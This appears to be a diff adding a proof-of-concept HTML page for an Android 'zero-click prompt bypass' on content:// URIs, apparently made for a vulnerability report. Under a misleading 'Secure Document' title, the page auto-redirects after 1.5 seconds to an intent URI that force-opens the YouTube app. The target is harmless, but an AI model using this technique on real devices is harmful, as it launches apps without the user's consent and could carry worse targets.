@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secure Document</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #fff; color: #000; }
+    </style>
+</head>
+<body>
+    <p id="status">Loading document securely...</p>
+    
+    <script>
+        // Triggering the payload automatically after a short delay
+        // to demonstrate the zero-click prompt bypass on content:// URIs
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById("status").innerText = "Redirecting...";
+                
+                // Target: Force-open YouTube app and autoplay a specific video
+                window.location.replace("intent://dQw4w9WgXcQ/#Intent;scheme=vnd.youtube;package=com.google.android.youtube;end;");
+            }, 1500); // 1.5 seconds delay for visual confirmation in the PoC video
+        };
+    </script>
+</body>
+</html>
